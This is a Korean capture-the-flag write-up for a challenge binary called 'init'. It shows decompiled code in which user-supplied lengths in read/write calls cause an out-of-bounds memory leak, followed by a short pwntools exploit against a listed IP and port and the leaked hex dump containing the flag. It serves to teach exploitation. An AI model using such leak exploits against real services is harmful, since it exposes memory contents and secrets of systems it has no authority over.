`#read` `#leak`

# init
1. [Description](#description)
2. [일단 실행](#일단-실행)
3. [취약점 파악](#취약점-파악)
4. [exploit.py](#exploit.py)
5. [FLAG](#flag)

## Description
> 서버 바이너리에는 정상적으로 플래그가 있습니다
> nc 121.170.91.17 9901
> [init](https://drive.google.com/uc?authuser=0&id=1IIQkcbDemlX3ceIQhWfu-o5zeqcdh3_D&export=download)

## 일단 실행
```
# ./init
Do you want to do?
[R]ead
[W]rite
[E]xit
>>>
```
읽고 쓰고가 가능해보임

## 취약점 파악
```
    44          printf("length: ", &v5);                // [R]ead
    45          __isoc99_scanf("%d", &len);
    46          v3 = &buf;
    47          read(0, &buf, len);
    48        }
    49        if ( v5 != 'W' )
    50          break;
    51        printf("length: ", &v5);                  // [W]rite
    52        __isoc99_scanf("%d", &len);
    53        v3 = &buf;
    54        write(1, &buf, len);
```
`[R]ead` 와 `[W]rite` 는 길이 len 을 직접 사용자로부터 입력받는다.
메모리 leak 이 가능해보임

## exploit.py
```
     1  from pwn import *
     2
     3  r = remote('121.170.91.17', 9901)
     4  r.recvuntil('>>> ')
     5  r.send('W')
     6  r.recvuntil(': ')
     7  r.sendline(str(0x50-8+1))
     8  r.interactive()
```
## FLAG

```
[DEBUG] Sent 0x1 bytes:
    'W' * 0x1
[DEBUG] Received 0x8 bytes:
    'length: '
[DEBUG] Sent 0x3 bytes:
    '73\n'
[*] Switching to interactive mode
[DEBUG] Received 0x49 bytes:
    00000000  68 81 67 18  26 7f 00 00  ff b5 f0 00  00 00 00 00  │h·g·│&···│····│····│
    00000010  01 00 00 00  00 00 00 00  ed 6a 45 ae  6f 55 00 00  │····│····│·jE·│oU··│
    00000020  64 69 6d 69  7b 41 31 31  30 63 41 74  33 5f 31 73  │dimi│{A11│0cAt│3_1s│
    00000030  5f 24 6f 5f  31 6d 70 30  72 74 40 6e  37 7d 00 00  │_$o_│1mp0│rt@n│7}··│
    00000040  c0 cc 26 da  ff 7f 00 00  00                        │··&·│····│·│
    00000049
h\x81g\x18&\x7f\x00\x00\xff\xb5\x00\x00\x00\x00\x00\x00\x00\x00\x00jE\xaeoU\x00\x00dimi{A110cAt3_1s_$o_1mp0rt@n7}\x00\x00&\x7f\x00\x00\x00
```
